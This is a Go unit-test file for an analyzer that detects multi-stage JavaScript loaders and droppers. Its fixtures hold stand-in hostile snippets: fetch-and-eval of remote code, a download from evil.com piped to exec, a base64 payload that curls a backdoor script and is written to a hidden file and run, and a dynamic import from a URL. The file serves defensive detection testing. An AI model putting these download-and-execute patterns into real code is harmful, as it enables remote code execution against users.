package analyzer

import (
	"strings"
	"testing"
)

func TestMultiStageLoader_FetchAndEval(t *testing.T) {
	a := NewMultiStageLoaderAnalyzer()
	content := `
const response = await fetch('https://cdn.example.com/stage2.js');
const code = await response.text();
eval(code);
`
	findings := a.scanContent(content, "loader.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "stage") || strings.Contains(f.Title, "Stage") || strings.Contains(f.Title, "loader") || strings.Contains(f.Title, "remote") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect fetch-and-eval multi-stage loader")
	}
}

func TestMultiStageLoader_HttpGetAndExec(t *testing.T) {
	a := NewMultiStageLoaderAnalyzer()
	content := `
const https = require('https');
const { exec } = require('child_process');
https.get('https://evil.com/payload.sh', (res) => {
	let data = '';
	res.on('data', (chunk) => data += chunk);
	res.on('end', () => {
		exec(data);
	});
});
`
	findings := a.scanContent(content, "dropper.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "stage") || strings.Contains(f.Title, "Stage") || strings.Contains(f.Title, "dropper") || strings.Contains(f.Title, "Dropper") || strings.Contains(f.Title, "loader") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect HTTP download-and-exec dropper")
	}
}

func TestMultiStageLoader_WriteAndExecute(t *testing.T) {
	a := NewMultiStageLoaderAnalyzer()
	content := `
const fs = require('fs');
const { execSync } = require('child_process');
const payload = Buffer.from('IyEvYmluL2Jhc2gKY3VybCBodHRwOi8vZXZpbC5jb20vYmFja2Rvb3Iuc2g=', 'base64');
fs.writeFileSync('/tmp/.hidden', payload);
execSync('chmod +x /tmp/.hidden && /tmp/.hidden');
`
	findings := a.scanContent(content, "install.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "write") || strings.Contains(f.Title, "Write") || strings.Contains(f.Title, "drop") || strings.Contains(f.Title, "Drop") || strings.Contains(f.Title, "file") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect write-to-disk-and-execute pattern")
	}
}

func TestMultiStageLoader_DynamicImport(t *testing.T) {
	a := NewMultiStageLoaderAnalyzer()
	content := `
const url = 'https://cdn.example.com/module.mjs';
const mod = await import(url);
mod.default();
`
	findings := a.scanContent(content, "dynamic.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "dynamic") || strings.Contains(f.Title, "Dynamic") || strings.Contains(f.Title, "remote") || strings.Contains(f.Title, "Remote") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect dynamic import from URL")
	}
}

func TestMultiStageLoader_CleanCode(t *testing.T) {
	a := NewMultiStageLoaderAnalyzer()
	content := `
const fs = require('fs');
const data = fs.readFileSync('config.json', 'utf8');
const config = JSON.parse(data);
console.log(config.port);
`
	findings := a.scanContent(content, "clean.js")
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity in clean code: %s", f.Title)
		}
	}
}
